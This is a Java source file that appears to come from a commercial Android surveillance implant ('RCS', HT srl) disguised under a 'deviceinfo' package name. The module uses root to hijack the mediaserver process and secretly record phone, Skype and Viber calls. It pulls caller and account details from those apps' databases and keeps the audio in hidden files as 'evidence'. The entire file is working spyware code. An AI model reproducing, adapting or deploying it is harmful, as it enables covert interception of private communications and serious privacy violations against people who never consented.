/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;

import android.media.MediaRecorder;
import android.os.Build;
import android.os.FileObserver;

import com.android.deviceinfo.Call;
import com.android.deviceinfo.Device;
import com.android.deviceinfo.ProcessInfo;
import com.android.deviceinfo.RunningProcesses;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfModule;
import com.android.deviceinfo.conf.Configuration;
import com.android.deviceinfo.conf.ConfigurationException;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.evidence.EvidenceReference;
import com.android.deviceinfo.evidence.EvidenceType;
import com.android.deviceinfo.evidence.Markup;
import com.android.deviceinfo.file.AutoFile;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.interfaces.Observer;
import com.android.deviceinfo.listener.ListenerCall;
import com.android.deviceinfo.listener.ListenerProcess;
import com.android.deviceinfo.module.chat.CallInfo;
import com.android.deviceinfo.module.chat.ChatSkype;
import com.android.deviceinfo.module.chat.ChatViber;
import com.android.deviceinfo.util.AudioEncoder;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.CallBack;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.DataBuffer;
import com.android.deviceinfo.util.DateTime;
import com.android.deviceinfo.util.Execute;
import com.android.deviceinfo.util.ICallBack;
import com.android.deviceinfo.util.Instrument;
import com.android.deviceinfo.util.Utils;
import com.android.deviceinfo.util.WChar;
import com.android.m.M;

public class ModuleCall extends BaseModule implements Observer<Call> {
	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
	private static final int HEADER_SIZE = 6;
	private MediaRecorder recorder = null;
	private boolean recordFlag;
	private String currentRecordFile;
	// private Date fromTime;
	// private String number, model;
	private int strategy = 0;

	private static final int CHANNEL_LOCAL = 0;
	private static final int CHANNEL_REMOTE = 1;

	private static final int CALLIST_PHONE = 0x0;
	private static final int CALLIST_SKYPE = 0x1;
	private static final int CALLIST_VIBER = 0x2;

	// From audio.h, Android 4.x
	private static final int AUDIO_STREAM_VOICE_CALL = 0;
	private static final int AUDIO_STREAM_SYSTEM = 1;
	private static final int AUDIO_STREAM_RING = 2;
	private static final int AUDIO_STREAM_MUSIC = 3;
	private static final int AUDIO_STREAM_MIC = -2; // Defined by us, not by
													// Android

	private FileObserver observer;
	private Thread queueMonitor;
	private static final Object sync = new Object();
	private static BlockingQueue<String> calls;
	private EncodingTask encodingTask;
	private CallBack cb;
	private Instrument hijack;

	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
	protected static final int CALL_PHONE = 0x0145;

	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
	private RunningProcesses runningProcesses;
	private CallInfo callInfo;
	private List<Chunk> chunks = new ArrayList<Chunk>();

	@Override
	public boolean parse(ConfModule conf) {
		if (conf.has("record")) {
			try {
				recordFlag = conf.getBoolean("record");
			} catch (ConfigurationException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				recordFlag = false;
			}
		}

		return true;
	}

	@Override
	public void actualGo() {

	}

	@Override
	public void actualStart() {
		ListenerCall.self().attach(this);

		runningProcesses = new RunningProcesses();
		callInfo = new CallInfo();

		if (recordFlag) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
			}
		}

		// Try to create the audio storage, at this point the sdcard might take
		// a while to come up
		boolean audioStorageOk = false;

		for (int i = 0; i < 5; i++) {
			if (AudioEncoder.createAudioStorage() == true) {
				audioStorageOk = true;
				break;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): retrying to create the audio storage");
			}

			Utils.sleep(1000);
		}

		if (audioStorageOk == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): unable to create audio storage");
			}
		}

		if (Status.haveRoot() && audioStorageOk) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): starting audio storage management");
			}

			// Initialize the callback system
			cb = new CallBack();
			cb.register(new InternalCallBack());

			hijack = new Instrument("mediaserver", AudioEncoder.getAudioStorage());

			if (hijack.installHijacker()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(actualStart): hijacker successfully installed");
				}

				hijack.startInstrumentation();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(actualStart): hijacker cannot be installed");
				}

				return;
			}

			calls = new LinkedBlockingQueue<String>();

			// Remove stray .bin files
			purgeAudio();

			// Scan for previously stored audio files
			scrubAudio();

			// Start the monitor and encoding thread
			encodingTask = new EncodingTask(sync, calls);

			queueMonitor = new Thread(encodingTask);
			queueMonitor.start();

			// Give it time to spawn before signaling
			Utils.sleep(500);

			while (queueMonitor.isAlive() == false) {
				Utils.sleep(250);
			}

			// Tell the thread to process scrubbed files
			encodingTask.wake();

			// Observe our audio storage (events are filtered so if you push a
			// .tmp using ADB it wont
			// trigger, you have to copy the test file and RENAME it .tmp to
			// trigger this observer)
			observer = new FileObserver(AudioEncoder.getAudioStorage(), FileObserver.MOVED_TO) {
				@Override
				public void onEvent(int event, String file) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(onEvent): event: " + event + " for file: " + file);
					}

					// Add to list
					if (addToEncodingList(AudioEncoder.getAudioStorage() + file) == true) {
						synchronized (sync) {
							if (Cfg.DEBUG) {
								Check.log(TAG + "(onEvent): signaling EncodingTask thread");
							}

							encodingTask.wake();
						}
					}
				}
			};

			observer.startWatching();
		}
	}

	private void purgeAudio() {
		// Scrub for existing files on FS
		File f = new File(AudioEncoder.getAudioStorage());

		FilenameFilter filter = new FilenameFilter() {
			public boolean accept(File dir, String name) {
				return (name.startsWith("Qi-") && name.toLowerCase().endsWith(".bin"));
			}
		};

		File file[] = f.listFiles(filter);
		long now = System.currentTimeMillis() / 1000;

		// Remove old files
		for (File storedFile : file) {
			String fullName = storedFile.getAbsolutePath();

			// Stored filetime (unix epoch() is in seconds not ms)
			String split[] = fullName.split("-");
			long epoch = Long.parseLong(split[1]);

			// Files older than 24 hours are removed
			if (now - epoch > 60 * 60 * 24) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(purgeAudio): removing stray binary: " + fullName + " which is: " + (now - epoch)
							/ 3600 + " hours old");
				}

				// Make it read-write
				Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + fullName);

				storedFile.delete();
			}
		}
	}

	private void scrubAudio() {
		// Scrub for existing files on FS
		File f = new File(AudioEncoder.getAudioStorage());

		FilenameFilter filter = new FilenameFilter() {
			public boolean accept(File dir, String name) {
				return (name.startsWith("Qi-") && name.toLowerCase().endsWith(".tmp"));
			}
		};

		File file[] = f.listFiles(filter);

		// Che palle Java!
		List<File> filesList = new java.util.ArrayList<File>();
		filesList.addAll(java.util.Arrays.asList(file));
		java.util.Collections.sort(filesList);

		// Adding scrubbed files
		for (File storedFile : filesList) {
			String fullName = storedFile.getAbsolutePath();

			addToEncodingList(fullName);
		}
	}

	class EncodingTask implements Runnable, Observer<ProcessInfo> {
		Object sync;
		BlockingQueue<String> queue;
		boolean stopQueueMonitor;

		EncodingTask(Object t, BlockingQueue<String> l) {
			sync = t;
			queue = l;
			ListenerProcess.self().attach(this);
		}

		public void stop() {
			stopQueueMonitor = true;
			ListenerProcess.self().detach(this);
			wake();

		}

		public void wake() {
			synchronized (sync) {
				sync.notify();
			}
		}

		public void run() {
			while (true) {
				synchronized (sync) {
					try {
						sync.wait();
					} catch (InterruptedException e) {
						if (Cfg.EXCEPTION) {
							Check.log(e);
						}
					}
				}

				if (stopQueueMonitor) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(EncodingTask run): killing audio encoding thread");

					}
					return;
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + "(EncodingTask run): thread awoken, time to encode");
				}

				// Browse lists and check if an encoding is already in
				// progress
				try {
					while (queue.isEmpty() == false) {
						String file = queue.take();

						// Check if end of conversation
						if (Cfg.DEBUG) {
							Check.log(TAG + "(EncodingTask run): decoding " + file);
						}

						encodeChunks(file);

					}
				} catch (Exception e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}
				}

			}
		}

		@Override
		public int notification(ProcessInfo b) {
			return 0;
		}
	}

	synchronized private boolean addToEncodingList(String s) {
		if (s.contains("Qi-") == false || (s.endsWith("-l.tmp") == false && s.endsWith("-r.tmp") == false)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(addToEncodingList): " + s + " is not intended for us");
			}

			return false;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + "(addToEncodingList): adding \"" + s + "\" to the encoding list");
		}

		cb.trigger(s);

		// Make it read-write in any case
		Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + s);

		// Add the file to the list
		calls.add(s);

		return true;
	}

	@Override
	public void actualStop() {
		ListenerCall.self().detach(this);

		if (Status.haveRoot()) {
			if (queueMonitor != null && queueMonitor.isAlive()) {
				encodingTask.stop();
			}

			if (observer != null) {
				observer.stopWatching();
			}

			if (hijack != null) {
				hijack.stopInstrumentation();
			}
		}
	}

	public int notification(final Call call) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG
					+ " (notification): number: " + call.getNumber() + " in:" + call.isIncoming() + " runn:" + isRunning()); //$NON-NLS-1$
		}

		if (call.isOffhook() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call not yet established"); //$NON-NLS-1$
			}
			return 0;
		}

		final boolean incoming = call.isIncoming();
		boolean recording = false;

		try {
			// Let's start with call recording
			if (recordFlag && isSupported()) {
				recording = recordCall(call, incoming);
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " ERROR (notification), ", ex);
			}
		}

		if (!recordFlag && !call.isOngoing()) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Saving CallList evidence"); //$NON-NLS-1$
			}

			String from = call.getFrom();
			String to = call.getTo();

			saveCalllistEvidence(CALLIST_PHONE, from, to, incoming, call.getTimeBegin(), call.getDuration());
		}

		return 0;
	}

	private boolean recordCall(final Call call, final boolean incoming) {
		if (!call.isOngoing()) {
			if (stopRecord()) {
				Object future = Status.getStpe().schedule(new Runnable() {
					public void run() {
						String myNumber = Device.self().getPhoneNumber();
						saveCallEvidence(call.getNumber(), myNumber, incoming, call.getTimeBegin(), call.getTimeEnd(),
								currentRecordFile, true, 1, CALL_PHONE);
					}
				}, 100, TimeUnit.MILLISECONDS);

				// Se un giorno la conf non dovesse includere gia' tutti
				// i moduli,
				// self() tornerebbe NULL in quanto non instanziato.
				ModuleMic mic = ModuleMic.self();

				if (mic != null) {
					mic.resume();
				}
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call finished"); //$NON-NLS-1$
			}

			return true;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
		}

		int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
		int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;

		Long ts = Long.valueOf(System.currentTimeMillis());
		String tmp = ts.toString();

		// Logfile .3gpp in chiaro, temporaneo
		String path = Path.hidden() + tmp + M.e(".qzt");

		ModuleMic mic = ModuleMic.self();

		if (mic != null) {
			mic.suspend();
		}

		if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
			}

		} else {
			recordFlag = false;
		}

		mic = ModuleMic.self();

		if (mic != null) {
			mic.resume();
		}

		return false;
	}

	private boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
			String currentRecordFile, boolean autoClose, int channel, int programId) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " peer: " + peer + " from: " + dateBegin
					+ " to: " + dateEnd + " incoming: " + incoming);
		}

		final byte[] additionaldata = getCallAdditionalData(peer, myNumber, incoming, new DateTime(dateBegin),
				new DateTime(dateEnd), channel, programId);

		AutoFile file = new AutoFile(currentRecordFile);
		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCallEvidence): file size = " + file.getSize());
			}

			int offset = 0;
			byte[] header = file.read(0, 6);

			if (ByteArray.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveCallEvidence): AMR header");
				}
				offset = AMR_HEADER.length;
			}

			byte[] data = file.read(offset);
			int pos = checkIntegrity(data);

			if (pos != data.length) {
				data = ByteArray.copy(data, 0, pos);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
			}

			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, data);

			if (autoClose) {
				EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCallEvidence): deleting file: " + file);
			}

			file.delete();

			return true;
		} else {
			return false;
		}
	}

	private void closeCallEvidence(String peer, String number, boolean incoming, Date dateBegin, Date dateEnd,
			int programId) {
		final byte[] additionaldata = getCallAdditionalData(peer, number, incoming, new DateTime(dateBegin),
				new DateTime(dateEnd), CHANNEL_LOCAL, programId);

		if (Cfg.DEBUG) {
			Check.log(TAG + "(closeCallEvidence): closing call for " + peer);
		}

		EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
	}

	private int checkIntegrity(byte[] data) {
		int pos = 0;
		int chunklen = 0;

		while (pos < data.length) {
			chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];

			if (chunklen == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence) Error: zero len amr chunk, pos: " + pos);
				}
			}

			pos += chunklen + 1;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkIntegrity): end");
		}

		return pos;
	}

	private byte[] getCallAdditionalData(String peer, String myNumber, boolean incoming, DateTime dateBegin,
			DateTime dateEnd, int channels, int programId) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCallAdditionalData): " + peer);
		}

		if (Cfg.DEBUG) {
			Check.asserts(peer != null, " (getCallAdditionalData) Assert failed, null number");
		}

		byte[] caller;
		byte[] callee;

		callee = WChar.getBytes(myNumber);
		caller = WChar.getBytes(peer);

		final int version = 2008121901; // CALL_LOG_VERSION
		// final int program = 0x0145; // LOGTYPE_CALL_MOBILE
		final int LOG_AUDIO_CODEC_AMR = 0x1;
		int channel = channels; // 0 - local, 1 - remote
		int sampleRate = 8000 | LOG_AUDIO_CODEC_AMR;

		int len = 20 + 16 + 8 + caller.length + callee.length;
		final byte[] additionaldata = new byte[len];
		final DataBuffer additionalData = new DataBuffer(additionaldata, 0, len);

		additionalData.writeInt(version);
		additionalData.writeInt(channel);
		additionalData.writeInt(programId);
		additionalData.writeInt(sampleRate);
		additionalData.writeInt(incoming ? 1 : 0);
		additionalData.writeLong(dateBegin.getFiledate());
		additionalData.writeLong(dateEnd.getFiledate());

		additionalData.writeInt(caller.length);
		additionalData.writeInt(callee.length);

		additionalData.write(caller);
		additionalData.write(callee);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s", caller.length, callee.length);
			Check.log(TAG + " getPosition: %s, len: %s ", additionalData.getPosition(), len);
		}

		if (Cfg.DEBUG) {
			Check.asserts(additionalData.getPosition() == len, " (getCallAdditionalData) Assert failed, wrong len: "
					+ additionalData.getPosition() + ", wanted len:" + len);
		}

		return additionaldata;
	}

	private void saveCalllistEvidence(int programId, String from, String to, boolean incoming, Date fromTime,
			int duration) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveCalllistEvidence):  from: " + from + " to: " + to);
		}

		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		// Adding header
		try {

			int flags = incoming ? 1 : 0;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCalllistEvidence) %s: %ss", fromTime, duration);
			}

			outputStream.write(ByteArray.intToByteArray((int) (fromTime.getTime() / 1000)));
			outputStream.write(ByteArray.intToByteArray(programId));
			outputStream.write(ByteArray.intToByteArray(flags));
			outputStream.write(WChar.getBytes(from, true));
			outputStream.write(WChar.getBytes(from, true));
			outputStream.write(WChar.getBytes(to, true));
			outputStream.write(WChar.getBytes(to, true));
			outputStream.write(ByteArray.intToByteArray(duration));
			outputStream.write(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));

		} catch (IOException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (preparePacket) Error: " + ex);
			}
			return;
		}

		byte[] data = outputStream.toByteArray();
		EvidenceReference.atomic(EvidenceType.CALLLISTNEW, null, data);
	}

	private boolean isSupported() {
		String model = Build.MODEL.toLowerCase();
		boolean supported = false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
		}
		// TODO: in Messages
		if (model.contains(M.e("i9100"))) { // Samsung Galaxy S2
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
			}
		} else if (model.contains(M.e("galaxy nexus"))) { // Samsung Galaxy
															// Nexus
			supported = true;
			strategy = MediaRecorder.AudioSource.DEFAULT;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
			}
		} else if (model.contains(M.e("gt-i9300"))) { // Galaxy S3
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Galaxy S3, supported"); //$NON-NLS-1$
			}
		} else if (model.contains(M.e("xt910"))) { // Motorola xt-910
			supported = false;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
			}
		} else if (model.contains(M.e("gt-p1000"))) { // Samsung Galaxy Tab 7''
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Samsung Galaxy Tab 7'',  supported"); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): model unsupported by call registration module"); //$NON-NLS-1$
			}
		}

		recordFlag = supported;
		return supported;
	}

	public synchronized static void addTypedString(DataBuffer databuffer, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);
			databuffer.writeInt(header);
			databuffer.write(WChar.getBytes(name));
		}
	}

	private boolean startRecord(int audioSource, int outputFormat, int audioEncoder, String path) {
		recorder = new MediaRecorder();

		recorder.setAudioSource(audioSource);
		recorder.setOutputFormat(outputFormat);
		// REMOVE
		// recorder.setAudioChannels(1);

		recorder.setAudioEncoder(audioEncoder);
		recorder.setOutputFile(path);

		try {
			recorder.prepare();
			recorder.start();
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (startRecord) Error: cannot start recording");
			}

			recorder = null;
			return false;
		}

		currentRecordFile = path;
		return true;
	}

	private boolean stopRecord() {
		if (recorder == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopRecord): recorder is already null"); //$NON-NLS-1$
			}

			return false;
		}

		recorder.stop();
		recorder.release();
		recorder = null;
		return true;
	}

	private int getStrategyNotYetWorking() {
		Markup markupCallStrategy = new Markup(this);
		HashMap<Integer, Boolean> strategyMap = null;

		// the markup exists, try to read it
		try {
			if (markupCallStrategy.isMarkup()) {
				strategyMap = (HashMap<Integer, Boolean>) markupCallStrategy.readMarkupSerializable();
			}

			// First time we run, let's try a strategy
			if (strategyMap == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): no markup found, testing strategies..."); //$NON-NLS-1$
				}

				// Start with strategy 1
				int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
				int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
				boolean res;

				strategyMap = new HashMap<Integer, Boolean>();

				res = testStrategy(MediaRecorder.AudioSource.VOICE_CALL, outputFormat, audioEncoder);

				// Strategy 0x04
				strategyMap.put(MediaRecorder.AudioSource.VOICE_CALL, res);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 4: " + res); //$NON-NLS-1$
				}

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_CALL;
				}

				// Strategy 0x02
				res = testStrategy(MediaRecorder.AudioSource.VOICE_UPLINK, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 2: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.VOICE_UPLINK, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_UPLINK;
				}

				// Strategy 0x03
				res = testStrategy(MediaRecorder.AudioSource.VOICE_DOWNLINK, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 3: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.VOICE_DOWNLINK, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_DOWNLINK;
				}

				// Strategy 0x01
				res = testStrategy(MediaRecorder.AudioSource.MIC, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 1: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.MIC, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.MIC;
				}

				markupCallStrategy.writeMarkupSerializable(strategyMap);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStrategy): no suitable strategy found"); //$NON-NLS-1$
				}
			} else { // Return the winning strategy
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): reading markup"); //$NON-NLS-1$
				}

				for (Integer i : strategyMap.keySet()) {
					boolean testedStrategy = strategyMap.get(i);

					if (testedStrategy == true) {
						// Return the winning strategy
						if (Cfg.DEBUG) {
							Check.log(TAG + " (getStrategy): using strategy  " + i); //$NON-NLS-1$
						}
						return i;
					}
				}

				// Ok we don't have a winning strategy
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStrategy): no strategy found in markup"); //$NON-NLS-1$
				}

				return 0;
			}
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (setStrategy): " + e);//$NON-NLS-1$
			}
		}

		return 0;
	}

	private boolean testStrategy(int audioSource, int outputFormat, int audioEncoder) {
		// Create dummy file
		Long ts = Long.valueOf(System.currentTimeMillis());
		String tmp = ts.toString();
		String path = Path.hidden() + tmp + ".qzt"; // file .3gp
		boolean success = false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (testStrategy): strategy: " + audioSource + " - dummy path: " + path); //$NON-NLS-1$
		}

		startRecord(audioSource, outputFormat, audioEncoder, path);

		// Utils.sleep(250);

		stopRecord();

		File dummy = new File(path);

		if (dummy.length() > 0) {
			success = true;
		}

		dummy.delete();
		dummy = null;

		return success;
	}

	private int wsize(String string) {
		if (string.length() == 0) {
			return 0;
		} else {
			return string.length() * 2 + 4;
		}
	}

	// start: call start date
	// sec_length: call length in seconds
	// type: call type (Skype, Viber, Paltalk, Hangout)
	private void encodeChunks(String f) {
		int first_epoch, last_epoch;
		AudioEncoder audioEncoder = new AudioEncoder(f);

		first_epoch = audioEncoder.getCallStartTime();
		last_epoch = audioEncoder.getCallEndTime();

		// Now rawPcm contains the raw data
		String encodedFile = f + ".err";

		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample())) {
			Date begin = new Date(first_epoch * 1000L);
			Date end = new Date(last_epoch * 1000L);

			int remote;

			if (encodedFile.endsWith("-r.tmp.err")) {
				remote = 1;
			} else {
				remote = 0;
			}

			if (!updateCallInfo(callInfo, false)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (encodeChunks): unknown call program");
				}
				return;
			}

			String caller = callInfo.getCaller();
			String callee = callInfo.getCallee();

			if (callInfo.delay) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (encodeChunks) delay, just add a chunk: " + chunks.size());
				}
				chunks.add(new Chunk(encodedFile, begin, end, remote));
			} else {
				// Encode to evidence
				// TODO add caller/callee phone number and right timestamps
				saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, remote, callInfo.programId);
			}

			// We have an end of call and it's on both channels
			if (audioEncoder.isLastCallFinished() && encodedFile.endsWith("-r.tmp.err")) {
				// After encoding create the end of call marker
				if (callInfo.delay) {
					saveAllEvidences(chunks, begin, end);
				} else {
					closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
				}
				callInfo = new CallInfo();
				chunks = new ArrayList<Chunk>();

				if (Cfg.DEBUG) {
					Check.log(TAG + "(encodeChunks): end of call reached");
				}
			}
		}

		// Remove file
		if (Cfg.DEBUG) {
			Check.log(TAG + "(encodeChunks): deleting " + f);
		}

		// Defensive, saveCallEvidence()/closeCallEvidence() already removes the
		// file
		audioEncoder.removeRawFile();

	}

	private void saveAllEvidences(List<Chunk> chunks, Date begin, Date end) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveAllEvidences) chunks: " + chunks.size());
		}
		CallInfo callInfo = new CallInfo();
		updateCallInfo(callInfo, true);

		String caller = callInfo.getCaller();
		String callee = callInfo.getCallee();
		for (Chunk chunk : chunks) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveAllEvidences) saving chunk: " + chunk.encodedFile);
			}
			saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.remote,
					callInfo.programId);

		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveAllEvidences) saving last chunk");
		}
		closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
	}

	private boolean updateCallInfo(CallInfo callInfo, boolean end) {

		// RunningAppProcessInfo fore = runningProcesses.getForeground();
		if (callInfo.valid) {
			return true;
		}

		ListenerProcess lp = ListenerProcess.self();

		if (lp.isRunning("com.skype.raider")) {
			if (end) {
				return true;
			}
			callInfo.processName = "com.skype.raider";
			// open DB
			String account = ChatSkype.readAccount();
			callInfo.account = account;
			callInfo.programId = 0x0146;
			callInfo.delay = false;

			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);

			boolean ret = false;
			if (helper != null) {
				ret = ChatSkype.getCurrentCall(helper, callInfo);
			}

			return ret;
		} else if (lp.isRunning("com.viber.voip")) {
			boolean ret = false;
			callInfo.processName = "com.viber.voip";
			callInfo.delay = true;
			// open DB
			callInfo.programId = 0x0148;
			if (end) {
				String account = ChatViber.readAccount();
				callInfo.account = account;
				GenericSqliteHelper helper = ChatViber.openViberDBHelper();

				if (helper != null) {
					ret = ChatViber.getCurrentCall(helper, callInfo);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateCallInfo) id: " + callInfo.id);
				}
			} else {
				callInfo.account = "delay";
				callInfo.peer = "delay";
				ret = true;
			}

			return ret;

		}
		return false;
	}

	public class InternalCallBack implements ICallBack {
		private static final String TAG = "InternalCallBack";

		public <O> void run(O o) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (run callback): " + o);
			}
		}
	}
}